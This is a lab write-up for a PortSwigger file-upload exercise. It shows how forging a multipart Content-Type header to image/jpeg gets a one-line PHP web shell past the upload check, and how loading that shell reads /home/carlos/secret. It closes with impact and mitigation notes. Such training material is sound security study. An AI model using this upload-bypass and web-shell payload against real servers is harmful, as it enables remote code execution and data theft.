# Web shell upload via Content-Type restriction bypass

**Source:** [PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)  
**Category:** File Upload  
**Difficulty:** Apprentice

## Objective
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

You can log in to your own account using the following credentials: `wiener:peter`

## Vulnerability
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

## Exploitation

### Steps
1. Access the lab and log in to your account, go to the user profile (**My account**) and find the avatar upload function.

2. Try to upload a `shell.php` file with PHP code that reads the contents of `/home/carlos/secret`:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    The application rejects the file, returning an error:
    ```text
    Sorry, file type application/octet-stream is not allowed
    Only image/jpeg and image/png are allowed
    Sorry, there was an error uploading your file.
    ```
    Conclusion: the application validates the file based on the **`Content-Type` header** sent by the client, not the actual file content. This header is **user-controlled data**, so it can be forged.

3. Intercept the upload request in Burp. In the multipart body we see the file part:
    ```text
    ------WebKitFormBoundarycdKjAA79jwzd2jw8
    Content-Disposition: form-data; name="avatar"; filename="shell.php"
    Content-Type: application/octet-stream
    ```

4. Change the `Content-Type` header from:
    ```text
    Content-Type: application/octet-stream
    ```
    to:
    ```text
    Content-Type: image/jpeg
    ```
    
5. Send the modified request. The application checks `Content-Type`, sees `image/jpeg` and lets the file through. The response confirms it was saved:
    ```text
    The file avatars/shell.php has been uploaded.
    ```

6. Open the uploaded file URL in the browser so the server executes it:
    ```text
    https://0a7300b9049b05a385effb3b00730054.web-security-academy.net/files/avatars/shell.php
    ```
    The server executes the PHP code - `file_get_contents` reads the contents of `/home/carlos/secret`, and `echo` outputs it in the HTTP response:
    ```text
    zmOU3tFJUDSTdSFDLU55LFI1wALJrBHE
    ```

7. Copy the secret and submit it via the **Submit solution** button in the lab banner. Lab solved.

### Payload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Shortcut
1. Log in and go to **My account** -> avatar upload.
2. Intercept the upload request in Burp.
3. Change the file part's `Content-Type` to `image/jpeg`.
4. Forward the request and open `/files/avatars/shell.php`.
5. Copy the returned secret and submit it via **Submit solution**.

## Impact
An attacker can bypass upload validation by forging the `Content-Type` header, upload a PHP file, and execute arbitrary code on the server. This leads to remote code execution, allowing sensitive file reads, secret exfiltration, and potentially full server compromise.

## Mitigation
Validate uploaded files based on actual content, not client-supplied headers. Use an allowlist of permitted file types and verify magic bytes. Do not trust the `Content-Type` header from the request. Store uploads outside the web root or in a directory with script execution disabled. Rename files and serve them with a safe `Content-Type`.

## Tools
- Burp Suite
- Repeater
- VSC

## Notes
- Upload validation relies on the client-supplied `Content-Type` header.
- Changing `Content-Type` to `image/jpeg` bypasses the check.
- Uploaded avatars are stored under `/files/avatars/`.
- The server executes PHP in the upload directory, enabling RCE.
- The secret is read from `/home/carlos/secret` and returned in the response.